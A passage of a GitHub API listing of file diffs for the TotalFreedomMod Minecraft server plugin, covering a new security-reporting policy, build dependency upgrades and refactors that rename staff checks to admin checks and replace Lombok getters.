    "patch": "@@ -0,0 +1,20 @@\n+# Security Policy\n+\n+## Supported Versions\n+\n+We currently support the code running on the \"development\" branch of this repository. This is supported in addition to those formal releases, but note anything not yet released should be treated as in-development.\n+\n+In terms of plugin releases, we support the following versions:\n+\n+| Version | Supported          |\n+| ------- | ------------------ |\n+| 2020.11   | :white_check_mark: |\n+| 6.0.x (Pre-Release)  | :x:                |\n+| < 2020.11  | :x:                |\n+| < 5.x  | :x:                |\n+\n+## Reporting a Vulnerability\n+\n+If the report has minor security implications (ie we've added a super admin to a senior admins permission) please raise an post on [our forums](https://forum.totalfreedom.me/) in the first instance. If you do not have a forum account and do not wish to sign up, please e-mail us using the e-mail in the next sentence.\n+\n+For security vulnerabilities that are more severe and that may pose a more significant threat to the servers running this plugin, please e-mail os-security-reports [ AT ] atlas-media.co.uk - You can expect an automated response immediately to acknowledge receipt of your e-mail, and one of our team will aim to respond within 72 hours and will work with you on the best way to address your concerns. "
  },
  {
    "sha": "d3cab91f4958b69c5bc0ca242ecfcece6172db1f",
    "filename": "checkstyle.xml",
    "status": "modified",
    "additions": 2,
    "deletions": 2,
    "changes": 4,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/checkstyle.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/checkstyle.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/checkstyle.xml?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -91,7 +91,7 @@\n                      value=\"Local variable name ''{0}'' must match pattern ''{1}''.\"/>\n         </module>\n         <module name=\"ClassTypeParameterName\">\n-            <property name=\"format\" value=\"(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9]*[T]$)\"/>\n+            <property name=\"format\" value=\"(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9][_]*[T]$)\"/>\n             <message key=\"name.invalidPattern\"\n                      value=\"Class type name ''{0}'' must match pattern ''{1}''.\"/>\n         </module>\n@@ -133,4 +133,4 @@\n         </module>\n         <module name=\"CommentsIndentation\"/>\n     </module>\n-</module>\n\\ No newline at end of file\n+</module>"
  },
  {
    "sha": "65f12570a650696b9098be157a205d2774353a8b",
    "filename": "nb-configuration.xml",
    "status": "added",
    "additions": 19,
    "deletions": 0,
    "changes": 19,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/nb-configuration.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/nb-configuration.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/nb-configuration.xml?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -0,0 +1,19 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<project-shared-configuration>\n+    <!--\n+This file contains additional configuration written by modules in the NetBeans IDE.\n+The configuration is intended to be shared among all the users of project and\n+therefore it is assumed to be part of version control checkout.\n+Without this configuration present, some functionality in the IDE may be limited or fail altogether.\n+-->\n+    <properties xmlns=\"http://www.netbeans.org/ns/maven-properties-data/1\">\n+        <!--\n+Properties that influence various parts of the IDE, especially code formatting and the like. \n+You can copy and paste the single properties, into the pom.xml file and the IDE will pick them up.\n+That way multiple projects can share the same settings (useful for formatting rules for example).\n+Any value defined here will override the pom.xml file value but is only applicable to the current project.\n+-->\n+        <netbeans.hint.jdkPlatform>JDK_11</netbeans.hint.jdkPlatform>\n+        <netbeans.checkstyle.format>true</netbeans.checkstyle.format>\n+    </properties>\n+</project-shared-configuration>"
  },
  {
    "sha": "271d166dcccc896b65bd7fd07a3e625a8b74c56d",
    "filename": "pom.xml",
    "status": "modified",
    "additions": 34,
    "deletions": 38,
    "changes": 72,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/pom.xml",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/pom.xml",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/pom.xml?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -5,20 +5,20 @@\n \n     <groupId>me.totalfreedom</groupId>\n     <artifactId>TotalFreedomMod</artifactId>\n-    <version>2020.11.5</version>\n+    <version>2021.02-RC02</version>\n     <packaging>jar</packaging>\n \n     <properties>\n         <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n-        <tfm.build.codename>Antaeus</tfm.build.codename>\n+        <tfm.build.codename>Phoenix</tfm.build.codename>\n         <jar.finalName>${project.name}</jar.finalName>\n         <timestamp>${maven.build.timestamp}</timestamp>\n         <maven.build.timestamp.format>MM/dd/yyyy HH:mm</maven.build.timestamp.format>\n     </properties>\n \n     <name>TotalFreedomMod</name>\n     <description>Server modification for the TotalFreedom server</description>\n-    <url>https://github.com/TFPatches/TotalFreedomMod</url>\n+    <url>https://github.com/AtlasMediaGroup/TotalFreedomMod</url>\n \n     <licenses>\n         <license>\n@@ -66,12 +66,12 @@\n \n         <repository>\n             <id>elmakers-repo</id>\n-            <url>http://maven.elmakers.com/repository/</url>\n+            <url>https://maven.elmakers.com/repository/</url>\n         </repository>\n \n         <repository>\n             <id>sk89q-snapshots</id>\n-            <url>http://maven.sk89q.com/artifactory/repo</url>\n+            <url>https://maven.sk89q.com/artifactory/repo</url>\n         </repository>\n \n         <repository>\n@@ -87,17 +87,17 @@\n \n         <repository>\n             <id>md_5-public</id>\n-            <url>http://repo.md-5.net/content/groups/public/</url>\n+            <url>https://repo.md-5.net/content/groups/public/</url>\n         </repository>\n \n         <repository>\n             <id>dmulloy2-repo</id>\n-            <url>http://repo.dmulloy2.net/nexus/repository/public/</url>\n+            <url>https://repo.dmulloy2.net/nexus/repository/public/</url>\n         </repository>\n \n         <repository>\n             <id>sk89q-repo</id>\n-            <url>http://maven.sk89q.com/repo/</url>\n+            <url>https://maven.sk89q.com/repo/</url>\n         </repository>\n \n         <repository>\n@@ -114,20 +114,9 @@\n             <id>ess-repo</id>\n             <url>https://ci.ender.zone/plugin/repository/everything/</url>\n         </repository>\n-\n-        <repository>\n-            <id>telesphoreo-repo</id>\n-            <url>https://telesphoreo.me/repo/maven/</url>\n-        </repository>\n     </repositories>\n \n     <dependencies>\n-        <dependency>\n-            <groupId>org.projectlombok</groupId>\n-            <artifactId>lombok</artifactId>\n-            <version>1.18.16</version>\n-            <scope>provided</scope>\n-        </dependency>\n \n         <dependency>\n             <groupId>commons-io</groupId>\n@@ -151,23 +140,23 @@\n         </dependency>\n \n         <dependency>\n-            <groupId>me.telesphoreo</groupId>\n-            <artifactId>mojangson</artifactId>\n-            <version>1.0</version>\n+            <groupId>com.github.speedxx</groupId>\n+            <artifactId>Mojangson</artifactId>\n+            <version>1957eef8d6</version>\n             <scope>compile</scope>\n         </dependency>\n \n         <dependency>\n             <groupId>org.bstats</groupId>\n             <artifactId>bstats-bukkit</artifactId>\n-            <version>1.7</version>\n+            <version>1.8</version>\n             <scope>compile</scope>\n         </dependency>\n \n         <dependency>\n             <groupId>org.spigotmc</groupId>\n             <artifactId>spigot</artifactId>\n-            <version>1.16.4-R0.1-SNAPSHOT</version>\n+            <version>1.16.5-R0.1-SNAPSHOT</version>\n             <scope>provided</scope>\n         </dependency>\n \n@@ -195,21 +184,21 @@\n         <dependency>\n             <groupId>net.ess3</groupId>\n             <artifactId>EssentialsX</artifactId>\n-            <version>2.18.1</version>\n+            <version>2.18.2</version>\n             <scope>provided</scope>\n         </dependency>\n \n         <dependency>\n             <groupId>net.dv8tion</groupId>\n             <artifactId>JDA</artifactId>\n-            <version>4.2.0_168</version>\n+            <version>4.2.0_224</version>\n             <scope>provided</scope>\n         </dependency>\n \n         <dependency>\n             <groupId>net.coreprotect</groupId>\n             <artifactId>coreprotect</artifactId>\n-            <version>19.1</version>\n+            <version>19.3</version>\n             <scope>provided</scope>\n         </dependency>\n \n@@ -223,7 +212,7 @@\n         <dependency>\n             <groupId>io.papermc</groupId>\n             <artifactId>paperlib</artifactId>\n-            <version>1.0.5</version>\n+            <version>1.0.6</version>\n             <scope>compile</scope>\n         </dependency>\n \n@@ -269,18 +258,24 @@\n             <scope>provided</scope>\n         </dependency>\n \n+        <dependency>\n+            <groupId>org.jetbrains</groupId>\n+            <artifactId>annotations</artifactId>\n+            <version>20.1.0</version>\n+            <scope>compile</scope>\n+        </dependency>\n+\n         <dependency>\n             <groupId>org.apache.maven.plugins</groupId>\n             <artifactId>maven-checkstyle-plugin</artifactId>\n             <version>3.1.1</version>\n             <scope>compile</scope>\n         </dependency>\n-\n         <dependency>\n-            <groupId>net.dean.jraw</groupId>\n-            <artifactId>JRAW</artifactId>\n-            <version>1.1.0</version>\n-            <scope>provided</scope>\n+            <groupId>org.junit.jupiter</groupId>\n+            <artifactId>junit-jupiter</artifactId>\n+            <version>5.4.2</version>\n+            <scope>compile</scope>\n         </dependency>\n     </dependencies>\n \n@@ -301,9 +296,9 @@\n                 <version>3.8.1</version>\n                 <configuration>\n                     <outputFileName>TotalFreedomMod.jar</outputFileName>\n-                    <compilerVersion>1.8</compilerVersion>\n-                    <source>1.8</source>\n-                    <target>1.8</target>\n+                    <compilerVersion>11</compilerVersion>\n+                    <source>11</source>\n+                    <target>11</target>\n                 </configuration>\n             </plugin>\n \n@@ -455,8 +450,9 @@\n                                     <include>org.javassist:javassist</include>\n                                     <include>me.rayzr522:jsonmessage</include>\n                                     <include>io.papermc:paperlib</include>\n-                                    <include>me.telesphoreo:mojangson</include>\n+                                    <include>com.github.speedxx:Mojangson</include>\n                                     <include>org.bstats:bstats-bukkit</include>\n+                                    <include>org.jetbrains:annotations</include>\n                                 </includes>\n                             </artifactSet>\n                         </configuration>\n@@ -483,4 +479,4 @@\n             </plugin>\n         </plugins>\n     </reporting>\n-</project>\n\\ No newline at end of file\n+</project>"
  },
  {
    "sha": "c6a0e470b498b6f62950145dbfe2c2355d8d6567",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/Announcer.java",
    "status": "modified",
    "additions": 19,
    "deletions": 4,
    "changes": 23,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/Announcer.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/Announcer.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/Announcer.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -3,7 +3,6 @@\n import com.google.common.collect.Lists;\n import java.util.Collections;\n import java.util.List;\n-import lombok.Getter;\n import me.totalfreedom.totalfreedommod.config.ConfigEntry;\n import me.totalfreedom.totalfreedommod.util.FUtil;\n import org.bukkit.scheduler.BukkitRunnable;\n@@ -13,11 +12,8 @@\n {\n \n     private final List<String> announcements = Lists.newArrayList();\n-    @Getter\n     private boolean enabled;\n-    @Getter\n     private long interval;\n-    @Getter\n     private String prefix;\n     private BukkitTask announcer;\n \n@@ -80,4 +76,23 @@ public void announce(String message)\n         FUtil.bcastMsg(prefix + message);\n     }\n \n+    public boolean isEnabled()\n+    {\n+        return enabled;\n+    }\n+\n+    public long getInterval()\n+    {\n+        return interval;\n+    }\n+\n+    public String getPrefix()\n+    {\n+        return prefix;\n+    }\n+\n+    public BukkitTask getAnnouncer()\n+    {\n+        return announcer;\n+    }\n }"
  },
  {
    "sha": "ecefb7dd37d967fc32762a9c630e2b54e045ceb8",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/AntiNuke.java",
    "status": "modified",
    "additions": 0,
    "deletions": 1,
    "changes": 1,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AntiNuke.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AntiNuke.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/AntiNuke.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -42,7 +42,6 @@ public void onBlockBreak(BlockBreakEvent event)\n             fPlayer.resetBlockDestroyCount();\n \n             event.setCancelled(true);\n-            return;\n         }\n     }\n "
  },
  {
    "sha": "48065562a481ffc45d717783eb8d67c9e76395ac",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/AntiSpam.java",
    "status": "modified",
    "additions": 7,
    "deletions": 12,
    "changes": 19,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AntiSpam.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AntiSpam.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/AntiSpam.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -20,9 +20,9 @@\n \n     public static final int MSG_PER_CYCLE = 8;\n     public static final int TICKS_PER_CYCLE = 2 * 10;\n-    List<Player> markedForDeath = new ArrayList<>();\n     //\n     public BukkitTask cycleTask = null;\n+    List<Player> markedForDeath = new ArrayList<>();\n \n     @Override\n     public void onStart()\n@@ -62,7 +62,7 @@ public void onAsyncPlayerChat(AsyncPlayerChatEvent event)\n     {\n         final Player player = event.getPlayer();\n \n-        if (plugin.sl.isStaff(player))\n+        if (plugin.al.isAdmin(player))\n         {\n             return;\n         }\n@@ -73,7 +73,7 @@ public void onAsyncPlayerChat(AsyncPlayerChatEvent event)\n \n         // Check for spam\n         if (playerdata.incrementAndGetMsgCount() > MSG_PER_CYCLE)\n-        {   \n+        {\n             if (!markedForDeath.contains(player))\n             {\n                 markedForDeath.add(player);\n@@ -84,14 +84,13 @@ public void onAsyncPlayerChat(AsyncPlayerChatEvent event)\n \n                 event.setCancelled(true);\n             }\n-            return;\n         }\n         else if (playerdata.incrementAndGetMsgCount() > MSG_PER_CYCLE / 2)\n         {\n             FUtil.playerMsg(player, \"Please refrain from spamming chat.\", ChatColor.GRAY);\n             event.setCancelled(true);\n         }\n-        \n+\n     }\n \n     @EventHandler(priority = EventPriority.LOW)\n@@ -109,7 +108,7 @@ public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)\n             return;\n         }\n \n-        if (plugin.sl.isStaff(player))\n+        if (plugin.al.isAdmin(player))\n         {\n             return;\n         }\n@@ -127,10 +126,6 @@ public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)\n     @EventHandler(priority = EventPriority.NORMAL)\n     public void onPlayerKick(PlayerKickEvent event)\n     {\n-        if (markedForDeath.contains(event.getPlayer()))\n-        {\n-            markedForDeath.remove(event.getPlayer());\n-        }\n+        markedForDeath.remove(event.getPlayer());\n     }\n-\n-}\n+}\n\\ No newline at end of file"
  },
  {
    "sha": "63c9818a486cd75ffcc2f392b696f66875fc643f",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/AutoEject.java",
    "status": "modified",
    "additions": 3,
    "deletions": 8,
    "changes": 11,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AutoEject.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AutoEject.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/AutoEject.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -43,11 +43,7 @@ public void autoEject(Player player, String kickMessage)\n \n         ejects.put(ip, kicks);\n \n-        if (kicks <= 1)\n-        {\n-            method = EjectMethod.STRIKE_ONE;\n-        }\n-        else if (kicks == 2)\n+        if (kicks == 2)\n         {\n             method = EjectMethod.STRIKE_TWO;\n         }\n@@ -101,10 +97,9 @@ else if (kicks >= 3)\n         }\n     }\n \n-    public static enum EjectMethod\n+    public enum EjectMethod\n     {\n-\n-        STRIKE_ONE, STRIKE_TWO, STRIKE_THREE;\n+        STRIKE_ONE, STRIKE_TWO, STRIKE_THREE\n     }\n \n }"
  },
  {
    "sha": "e15a424e498c99a3e0ed667beaec70c244087108",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/AutoKick.java",
    "status": "modified",
    "additions": 2,
    "deletions": 1,
    "changes": 3,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AutoKick.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/AutoKick.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/AutoKick.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -46,9 +46,10 @@ public void onStop()\n \n     private void autoKickCheck()\n     {\n+        // No type cast was provided, one has been supplied.\n         final boolean doAwayKickCheck\n                 = plugin.esb.isEnabled()\n-                && ((server.getOnlinePlayers().size() / server.getMaxPlayers()) > autoKickThreshold);\n+                && (((float)server.getOnlinePlayers().size() / (float)server.getMaxPlayers()) > autoKickThreshold);\n \n         if (!doAwayKickCheck)\n         {"
  },
  {
    "sha": "19054c8a7534d057d53526fbfb2ce8b12361cf99",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/ChatManager.java",
    "status": "modified",
    "additions": 19,
    "deletions": 20,
    "changes": 39,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/ChatManager.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/ChatManager.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/ChatManager.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -1,11 +1,11 @@\n package me.totalfreedom.totalfreedommod;\n \n import com.google.common.base.Strings;\n+import me.totalfreedom.totalfreedommod.admin.Admin;\n import me.totalfreedom.totalfreedommod.config.ConfigEntry;\n import me.totalfreedom.totalfreedommod.player.FPlayer;\n import me.totalfreedom.totalfreedommod.player.PlayerData;\n import me.totalfreedom.totalfreedommod.rank.Displayable;\n-import me.totalfreedom.totalfreedommod.staff.StaffMember;\n import me.totalfreedom.totalfreedommod.util.FLog;\n import me.totalfreedom.totalfreedommod.util.FSync;\n import me.totalfreedom.totalfreedommod.util.FUtil;\n@@ -65,7 +65,7 @@ private void handleChatEvent(AsyncPlayerChatEvent event)\n             return;\n         }\n \n-        if (!ConfigEntry.TOGGLE_CHAT.getBoolean() && !plugin.sl.isStaff(player))\n+        if (!ConfigEntry.TOGGLE_CHAT.getBoolean() && !plugin.al.isAdmin(player))\n         {\n             event.setCancelled(true);\n             playerMsg(player, \"Chat is currently disabled.\", org.bukkit.ChatColor.RED);\n@@ -87,17 +87,17 @@ private void handleChatEvent(AsyncPlayerChatEvent event)\n             return;\n         }\n \n-        // Check for staffchat\n-        if (fPlayer.inStaffChat())\n+        // Check for adminchat\n+        if (fPlayer.inAdminChat())\n         {\n-            FSync.staffChatMessage(player, message);\n+            FSync.adminChatMessage(player, message);\n             event.setCancelled(true);\n             return;\n         }\n \n         // Check for 4chan trigger\n-        Boolean green = ChatColor.stripColor(message).toLowerCase().startsWith(\">\");\n-        Boolean orange = ChatColor.stripColor(message).toLowerCase().endsWith(\"<\");\n+        boolean green = ChatColor.stripColor(message).toLowerCase().startsWith(\">\");\n+        boolean orange = ChatColor.stripColor(message).toLowerCase().endsWith(\"<\");\n         if (ConfigEntry.FOURCHAN_ENABLED.getBoolean())\n         {\n             if (green)\n@@ -123,7 +123,7 @@ else if (orange)\n         }\n \n         // Check for mentions\n-        Boolean mentionEveryone = ChatColor.stripColor(message).toLowerCase().contains(\"@everyone\") && plugin.sl.isStaff(player);\n+        boolean mentionEveryone = ChatColor.stripColor(message).toLowerCase().contains(\"@everyone\") && plugin.al.isAdmin(player);\n         for (Player p : server.getOnlinePlayers())\n         {\n             if (ChatColor.stripColor(message).toLowerCase().contains(\"@\" + p.getName().toLowerCase()) || mentionEveryone)\n@@ -136,16 +136,15 @@ else if (orange)\n         event.setFormat(format);\n \n         // Send to discord\n-        if (!ConfigEntry.STAFF_ONLY_MODE.getBoolean() && !Bukkit.hasWhitelist() && !plugin.pl.getPlayer(player).isMuted() && !plugin.tfg.inGuildChat(player))\n+        if (!ConfigEntry.ADMIN_ONLY_MODE.getBoolean() && !Bukkit.hasWhitelist() && !plugin.pl.getPlayer(player).isMuted() && !plugin.tfg.inGuildChat(player))\n         {\n-            plugin.dc.messageChatChannel(plugin.dc.deformat(player.getName()) + \" \\u00BB \" + ChatColor.stripColor(message));\n+            plugin.dc.messageChatChannel(player.getName() + \" \\u00BB \" + ChatColor.stripColor(message));\n         }\n     }\n \n     public ChatColor getColor(Displayable display)\n     {\n-        ChatColor color = display.getColor();\n-        return color;\n+        return display.getColor();\n     }\n \n     public String getColoredTag(Displayable display)\n@@ -154,27 +153,27 @@ public String getColoredTag(Displayable display)\n         return color + display.getAbbr();\n     }\n \n-    public void staffChat(CommandSender sender, String message)\n+    public void adminChat(CommandSender sender, String message)\n     {\n         Displayable display = plugin.rm.getDisplay(sender);\n-        FLog.info(\"[STAFF] \" + sender.getName() + \" \" + display.getTag() + \": \" + message, true);\n+        FLog.info(\"[ADMIN] \" + sender.getName() + \" \" + display.getTag() + \": \" + message, true);\n         plugin.dc.messageAdminChatChannel(sender.getName() + \" \\u00BB \" + message);\n \n         for (Player player : server.getOnlinePlayers())\n         {\n-            if (plugin.sl.isStaff(player))\n+            if (plugin.al.isAdmin(player))\n             {\n-                StaffMember staffMember = plugin.sl.getAdmin(player);\n-                if (!Strings.isNullOrEmpty(staffMember.getAcFormat()))\n+                Admin admin = plugin.al.getAdmin(player);\n+                if (!Strings.isNullOrEmpty(admin.getAcFormat()))\n                 {\n-                    String format = staffMember.getAcFormat();\n+                    String format = admin.getAcFormat();\n                     ChatColor color = getColor(display);\n                     String msg = format.replace(\"%name%\", sender.getName()).replace(\"%rank%\", display.getAbbr()).replace(\"%rankcolor%\", color.toString()).replace(\"%msg%\", message);\n                     player.sendMessage(FUtil.colorize(msg));\n                 }\n                 else\n                 {\n-                    player.sendMessage(\"[\" + ChatColor.AQUA + \"STAFF\" + ChatColor.WHITE + \"] \" + ChatColor.DARK_RED + sender.getName() + ChatColor.DARK_GRAY + \" [\" + getColoredTag(display) + ChatColor.DARK_GRAY + \"]\" + ChatColor.WHITE + \": \" + ChatColor.GOLD + FUtil.colorize(message));\n+                    player.sendMessage(\"[\" + ChatColor.AQUA + \"ADMIN\" + ChatColor.WHITE + \"] \" + ChatColor.DARK_RED + sender.getName() + ChatColor.DARK_GRAY + \" [\" + getColoredTag(display) + ChatColor.DARK_GRAY + \"]\" + ChatColor.WHITE + \": \" + ChatColor.GOLD + FUtil.colorize(message));\n                 }\n             }\n         }\n@@ -184,7 +183,7 @@ public void reportAction(Player reporter, Player reported, String report)\n     {\n         for (Player player : server.getOnlinePlayers())\n         {\n-            if (plugin.sl.isStaff(player))\n+            if (plugin.al.isAdmin(player))\n             {\n                 playerMsg(player, ChatColor.RED + \"[REPORTS] \" + ChatColor.GOLD + reporter.getName() + \" has reported \" + reported.getName() + \" for \" + report);\n             }"
  },
  {
    "sha": "6a641beea8f2fba87e35fb97ade90e6f36b3ce6f",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/CommandSpy.java",
    "status": "modified",
    "additions": 4,
    "deletions": 4,
    "changes": 8,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/CommandSpy.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/CommandSpy.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/CommandSpy.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -23,18 +23,18 @@ public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)\n     {\n         for (Player player : server.getOnlinePlayers())\n         {\n-            if (plugin.sl.isStaff(player) && plugin.sl.getAdmin(player).getCommandSpy())\n+            if (plugin.al.isAdmin(player) && plugin.al.getAdmin(player).getCommandSpy())\n             {\n-                if (plugin.sl.isStaff(event.getPlayer()) && !plugin.sl.isAdmin(player))\n+                if (plugin.al.isAdmin(event.getPlayer()) && !plugin.al.isSeniorAdmin(player))\n                 {\n                     continue;\n                 }\n+\n                 if (player != event.getPlayer())\n                 {\n                     FUtil.playerMsg(player, event.getPlayer().getName() + \": \" + event.getMessage());\n                 }\n             }\n         }\n     }\n-\n-}\n+}\n\\ No newline at end of file"
  },
  {
    "sha": "67a61cc2db837aaf35aa06adbff734a1d6b768f4",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/EntityWiper.java",
    "status": "modified",
    "additions": 1,
    "deletions": 2,
    "changes": 3,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/EntityWiper.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/EntityWiper.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/EntityWiper.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -14,8 +14,6 @@\n \n public class EntityWiper extends FreedomService\n {\n-    private BukkitTask wiper;\n-\n     public List<EntityType> BLACKLIST = Arrays.asList(\n             EntityType.ARMOR_STAND,\n             EntityType.PAINTING,\n@@ -24,6 +22,7 @@\n             EntityType.ITEM_FRAME,\n             EntityType.MINECART\n     );\n+    private BukkitTask wiper;\n \n     @Override\n     public void onStart()"
  },
  {
    "sha": "7b66bbe541ffe62844f6b993fe86dee6d67b3b7c",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/FreedomService.java",
    "status": "modified",
    "additions": 4,
    "deletions": 2,
    "changes": 6,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/FreedomService.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/FreedomService.java",
    "contents_url": "https://api.github.com/repos/TotalFreedomMC/TotalFreedomMod/contents/src/main/java/me/totalfreedom/totalfreedommod/FreedomService.java?ref=1f3c30c6f5011e852ca2022ed8a729b077dc4820",
    "patch": "@@ -1,5 +1,6 @@\n package me.totalfreedom.totalfreedommod;\n \n+import java.util.logging.Logger;\n import me.totalfreedom.totalfreedommod.util.FLog;\n import org.bukkit.Server;\n import org.bukkit.event.Listener;\n@@ -8,17 +9,18 @@\n {\n     protected final TotalFreedomMod plugin;\n     protected final Server server;\n-    protected final FLog logger;\n+    protected final Logger logger;\n \n     public FreedomService()\n     {\n         plugin = TotalFreedomMod.getPlugin();\n         server = plugin.getServer();\n-        logger = new FLog();\n+        logger = FLog.getPluginLogger();\n         plugin.getServer().getPluginManager().registerEvents(this, plugin);\n         plugin.fsh.add(this);\n     }\n \n     public abstract void onStart();\n+\n     public abstract void onStop();\n }"
  },
  {
    "sha": "ffd397b20b768c24c12156c7d9a26147541c0f83",
    "filename": "src/main/java/me/totalfreedom/totalfreedommod/FreedomServiceHandler.java",
    "status": "modified",
    "additions": 6,
    "deletions": 3,
    "changes": 9,
    "blob_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/blob/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/FreedomServiceHandler.java",
    "raw_url": "https://github.com/TotalFreedomMC/TotalFreedomMod/raw/1f3c30c6f5011e852ca2022ed8a729b077dc4820/src/main/java/me/totalfreedom/totalfreedommod/FreedomServiceHandler.java",
